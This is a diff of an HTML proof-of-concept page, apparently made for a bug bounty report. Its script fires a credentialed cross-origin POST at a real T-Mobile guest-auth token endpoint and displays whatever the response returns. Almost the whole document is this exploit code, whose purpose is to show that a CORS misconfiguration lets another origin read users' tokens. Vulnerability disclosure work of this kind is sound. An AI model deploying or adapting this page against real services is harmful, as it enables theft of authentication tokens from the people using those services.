@@ -1,50 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Bug Bounty PoC</title>
+    <meta charset="UTF-8">
+    <title>T-Mobile PoC Test</title>
+    <style>
+        body { font-family: sans-serif; padding: 50px; text-align: center; }
+        #runBtn { 
+            padding: 20px 40px; 
+            font-size: 20px; 
+            background-color: #e20074; /* T-Mobile Magenta */
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            border-radius: 8px;
+        }
+        #runBtn:hover { background-color: #b1005b; }
+        #output { 
+            margin-top: 20px; 
+            text-align: left; 
+            background: #222; 
+            color: #0f0; 
+            padding: 20px; 
+            overflow: auto; 
+            min-height: 100px;
+        }
+    </style>
 </head>
 <body>
 
-    <h1>T-Mobile CORS Test</h1>
-    <button id="runBtn">Fire Fetch Request</button>
+    <h1>CORS Vulnerability Tester</h1>
+    <p>Target: <code>adn.t-mobile.com</code></p>
     
-    <h3>Results:</h3>
-    <pre id="output" style="background: #eee; padding: 10px; border: 1px solid #ccc; min-height: 50px;">
-        Click the button to start...
-    </pre>
+    <button id="runBtn">FIRE EXPLOIT REQUEST</button>
+    
+    <pre id="output">Results will appear here...</pre>
 
     <script>
-        document.getElementById('runBtn').addEventListener('click', function() {
+        document.getElementById('runBtn').addEventListener('click', async function() {
             const output = document.getElementById('output');
-            output.innerText = "Requesting...";
+            output.innerText = "Attempting fetch...";
 
-            const cacheBuster = '?v=' + Date.now();
-            const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+            try {
+                const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
+                const response = await fetch(target, {
+                    method: 'POST',
+                    mode: 'cors',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: '{}'
+                });
 
-            fetch(target, {
-                method: 'POST',
-                mode: 'cors',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'text/plain',
-                    'Cache-Control': 'no-cache'
-                },
-                body: '{}' 
-            })
-            .then(response => {
-                console.log("Status:", response.status);
-                // Proof of the bug: check if headers exist
-                console.log("ACAO:", response.headers.get('Access-Control-Allow-Origin'));
-                return response.text(); 
-            })
-            .then(data => {
-                output.innerText = data || "Success! (But body was empty)";
-                console.log("Data:", data);
-            })
-            .catch(err => {
-                output.innerText = "Bypass Failed: " + err;
-                console.error("Error details:", err);
-            });
+                const data = await response.text();
+                output.innerText = "Status: " + response.status + "\n\nBody: " + data;
+            } catch (err) {
+                output.innerText = "Error: " + err;
+            }
         });
     </script>
 
